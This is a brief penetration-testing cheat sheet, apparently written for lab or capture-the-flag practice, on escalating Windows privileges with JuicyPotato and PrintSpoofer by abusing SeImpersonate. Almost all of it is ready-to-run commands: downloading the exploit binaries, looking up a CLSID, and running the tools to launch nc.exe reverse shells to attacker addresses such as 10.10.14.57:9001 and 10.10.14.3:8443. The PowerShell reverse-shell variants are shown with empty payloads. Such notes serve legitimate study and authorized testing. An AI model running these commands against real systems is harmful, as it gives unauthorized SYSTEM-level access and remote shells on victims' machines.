> `JuicyPotato` doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. In that case, use `PrintSpoofer`
# JuicyPotato

Can be use with either `SeImpersonate` or `SeAssignPrimaryToken`

[Github page](https://github.com/ohpe/juicy-potato)


Download and transfer this binary to target machine, maybe also transfer `nc.exe`

```sh
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

Query `CLSID`

```cmd
reg query HKCR\CLSID /s /f LocalService
```

Then run this. `-c` flag is the `CLSID` we got from command above

```cmd
.\JuicyPotato.exe -l 53375 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}" -p c:\windows\system32\cmd.exe -a "/c c:\Windows\TEMP\nc.exe 10.10.14.57 9001 -e cmd.exe" -t *
```

Or, if you don't wanna use `nc.exe`, go to [revshells](https://www.revshells.com) and get a `powershell base64` revshell command

```cmd
.\JuicyPotato.exe -l 53375 -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-e " -t *
```

# PrintSpoofer

```sh
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

`PrintSpoofer` works with `SeImpersonate`

```cmd
.\PrintSpoofer64.exe -c "c:\nc.exe 10.10.14.3 8443 -e cmd"
```

Or the longer version

```cmd
.\PrintSpoofer.exe -c "powershell -e "
```
